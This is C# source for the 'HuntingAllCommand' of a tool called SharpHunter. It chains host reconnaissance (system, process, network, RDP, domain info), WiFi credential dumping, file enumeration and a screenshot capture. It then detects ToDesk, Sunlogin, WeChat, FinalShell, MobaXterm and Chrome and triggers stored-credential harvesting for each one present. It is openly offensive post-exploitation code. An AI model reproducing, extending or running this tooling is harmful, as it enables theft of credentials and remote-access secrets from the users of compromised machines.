using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using SharpHunter.Utils;

namespace SharpHunter.Commands
{
    class HuntingAllCommand : ICommand
    {
        public void Execute(List<string> args)
        {
            new SystemInfoCommand().Execute(args);
            new ProcessCommand().PrintProcessInfo(Logger.globalLogDirectory);
            new WifiCredCommand().Execute(args);
            new NetworkInfoCommand().Execute(args);
            new RDPInfoCommand().Execute(args);
            new SoftwareInfoCommand().Execute(args);
            new UserFileInfoCommand().Execute(args);
            Logger.TaskHeader("Hunting Software Credentials", 1);
            ExecuteConditionalCommands();
            ScreenShotPostCommand.CaptureScreenshot(Logger.globalLogDirectory);
            new DomainInfoCommand().Execute(args);
        }

        private void ExecuteConditionalCommands()
        {
            var softwareTargets = GetSoftwareTargets();

            foreach (var target in softwareTargets)
            {
                bool shouldExecute = false;

                foreach (var installName in target.InstallNames)
                {
                    if (GlobalContext.InstalledSoftware.Exists(s => s.name.Contains(installName)))
                    {
                        shouldExecute = true;
                        Logger.WriteLine($"[+] Hunted installed software: {installName}");
                        break;
                    }
                    else
                    {
                        Logger.WriteLine($"[-] Not found installed software: {installName}");
                    }
                }
                if (!shouldExecute)
                {
                    foreach (var processName in target.ProcessNames)
                    {
                        //Logger.WriteLine($"[*] Checking for running process: {processName}");
                        var runningProcess = GlobalContext.RunningProcesses.FirstOrDefault(p => p.ProcessName.Contains(processName));
                        if (!runningProcess.Equals(default(ProcessCommand.ProcessInfo)))
                        {
                            shouldExecute = true;
                            Logger.WriteLine($"[+] Hunted running process: {runningProcess.ProcessName} (matched with: {processName})");
                            break;
                        }
                        else
                        {
                            Logger.WriteLine($"[-] Not found running process: {processName}");
                        }
                    }
                }
                if (!shouldExecute)
                {
                    foreach (var condition in target.AdditionalConditions)
                    {
                        if (condition())
                        {
                            shouldExecute = true;
                            Logger.WriteLine($"[+] Additional condition met.");
                            break;
                        }
                        else
                        {
                            Logger.WriteLine($"[-] Not met additional condition.");
                        }
                    }
                }
                if (shouldExecute)
                {
                    target.Command();
                }
                Logger.WriteLine("");
            }
        }

        private List<SoftwareTarget> GetSoftwareTargets()
        {
            return new List<SoftwareTarget>
            {
                new SoftwareTarget
                {
                    InstallNames = new List<string> { "ToDesk" },
                    ProcessNames = new List<string> { "ToDesk.exe" },
                    Command = ToDeskCredCommand.GetToDeskCred
                },
                new SoftwareTarget
                {
                    InstallNames = new List<string> { "向日葵远程控制" },
                    ProcessNames = new List<string> { "SunloginClient.exe" },
                    Command = SunLoginCredCommand.GetSunLoginCred
                },
                new SoftwareTarget
                {
                    InstallNames = new List<string> { "微信" },
                    ProcessNames = new List<string> { "wechat.exe" },
                    Command = WeChatCredCommand.GetWechatCred
                },
                new SoftwareTarget
                {
                    //InstallNames = new List<string>(), // FinalShell 无安装名
                    ProcessNames = new List<string> { "finalshell.exe" },
                    Command = () => FinalShellCredCommand.GetFinalShellCred(),
                    AdditionalConditions = new List<Func<bool>>
                    {
                        () => FinalShellCredCommand.FindFinalShellConnPath() != null
                    }
                },
                new SoftwareTarget
                {
                    InstallNames = new List<string> { "MobaXterm" },
                    ProcessNames = new List<string> { "MobaXterm" },
                    Command = () => MobaXtermCredCommand.GetMobaXtermCred(),
                    AdditionalConditions = new List<Func<bool>>
                    {
                        () => MobaXtermCredCommand.DetermineMobaXtermVersion() != "Not Found"
                    }
                },
                new SoftwareTarget
                {
                    InstallNames = new List<string> { "Chrome" },
                    ProcessNames = new List<string> { "chrome.exe" },
                    Command = () => ChromiumCredCommand.GetChromiumCred(), 
                    AdditionalConditions = new List<Func<bool>>
                    {
                        () => ChromiumCredCommand.CheckBrowserDataPathsExist()
                    }
                }
            };
        }

    }

    public class SoftwareTarget
    {
        public List<string> InstallNames { get; set; } = new List<string>();
        public List<string> ProcessNames { get; set; } = new List<string>();
        public Action Command { get; set; }
        public List<Func<bool>> AdditionalConditions { get; set; } = new List<Func<bool>>();
    }
}